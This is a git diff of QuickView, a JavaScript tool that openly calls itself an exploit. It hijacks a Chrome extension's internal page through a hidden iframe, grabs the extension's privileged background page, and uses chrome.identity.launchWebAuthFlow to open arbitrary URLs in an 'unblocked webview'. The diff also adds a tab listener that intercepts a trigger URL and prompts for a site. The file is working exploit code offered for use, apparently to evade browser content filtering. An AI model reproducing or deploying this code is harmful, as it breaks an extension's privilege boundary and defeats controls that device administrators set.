@@ -80,12 +80,13 @@
           <input id="url_input" placeholder="Enter a URL here.">
           <a id="webview_button" class="button" href="#">Open Webview</a>
         </div>
-        <p id="status_text"></p>
+        <p>Enter any URL into the box above and it will open in an unblocked webview. Note that if the page load fails, the webview will close without displaying anything.</p>
         <h2>Preset URLs:</h2>
         <ul id="urls_list"></ul>
 
         <h2>Credits:</h2>
         <p>QuickView was created by Bypassi#7037 and vk6#7391, and it is licensed under the <a href="https://www.gnu.org/licenses/gpl-3.0.txt" target="_blank">GNU GPL v3</a>. The source code is available at: <a href="https://github.com/ading2210/quickview" target="_blank">https://github.com/ading2210/quickview</a></p>
+        <p>This exploit is part of the <a href="https://github.com/swarm-team">{swarm} project</a> and utilizes a variation of the <a href="https://bolg.glitch.me/_/point-blank" target="_blank">point-blank</a> exploit.</p>
       </div>
     </body>
   </html>`;
@@ -99,17 +100,15 @@
   }
   let bg = null;
 
-  function get_background() {
-    return new Promise((resolve, reject) => {
-      let iframe = document.createElement("iframe");
-      iframe.style.display = "none";
-      iframe.src = window.origin + "/scripts/common/elements/hyperlink/hyperlink.html";
-      iframe.onload = () => {
-        resolve(iframe.contentWindow.chrome.extension.getBackgroundPage());
-        iframe.remove();
-      }
-      document.body.append(iframe);
-    });
+  function get_background(callback) {
+    let iframe = document.createElement("iframe");
+    iframe.style.display = "none";
+    iframe.src = window.origin + "/scripts/common/elements/hyperlink/hyperlink.html";
+    iframe.onload = () => {
+      callback(iframe.contentWindow.chrome.extension.getBackgroundPage());
+      iframe.remove();
+    }
+    document.body.append(iframe);
   }
 
   function setup_page() {
@@ -119,18 +118,28 @@
       let li = document.createElement("li");
       let link = document.createElement("a");
       link.innerHTML = name;
-      link.onclick = () => {
+      link.onclick = function(){
         url_input.value = url;
       }
       link.href = "#";
 
       li.append(link);
       urls_list.append(li);
+      console.log(li);
     }
+    console.log(urls_list);
+    console.log(url_input);
   }
 
   function button_callback() {
     let url = from_id("url_input").value;
+    if (!url.startsWith("https://") && !url.startsWith("http://")) {
+      alert("Warning: Your URL does not begin with http:// or https://.");
+    }
+    open_webview(url);
+  }
+
+  function open_webview(url) {
     let popup_html = `data:text/html,
     <html>
       <head>
@@ -152,33 +161,31 @@
       () => {}
     );
   }
-
-  /*
+  
   function setup_listener() {
-    if (bg.listner_active) {return}
-    bg.listner_active = true;
-
-    bg.chrome.tabs.onUpdated.addListener((tab_id, event, tab) => {
-      if (event.status !== "loading") return;
-      if (tab.url !== "https://www.google.com/#%20") return;
-
-      let url = bg.prompt("Which URL should be opened?", "https://google.com");
-      bg.chrome.identity.launchWebAuthFlow(
-        { url: url || "https://google.com", interactive: true },
-        () => {}
-      );
-    });
+    if (bg.tab_listener) {
+      bg.chrome.tabs.onUpdated.removeListener(bg.tab_listener);
+    }
+    bg.tab_listener = (tab_id, event, tab) => {
+      if (event.status !== "loading") {return};
+      if (tab.url != "https://www.google.com/#%20") {return};
+      
+      bg.chrome.tabs.remove(tab_id);
+      bg.popup = bg.open();
+      let url = bg.popup.prompt("What URL would you like to open a webview for?", "https://www.google.com");
+      open_webview(url);
+    }
+    bg.chrome.tabs.onUpdated.addListener(bg.tab_listener);
   }
-  */
 
-  async function init() {
-    bg = await get_background();
+  function init(background) {
+    bg = background;
+    console.log(bg);
     document.write(html);
     setup_page();
-    //setup_listener();
+    setup_listener();
     from_id("webview_button").onclick = button_callback;
   }
 
-  init();
-
-})()
+  get_background(init);
+})();
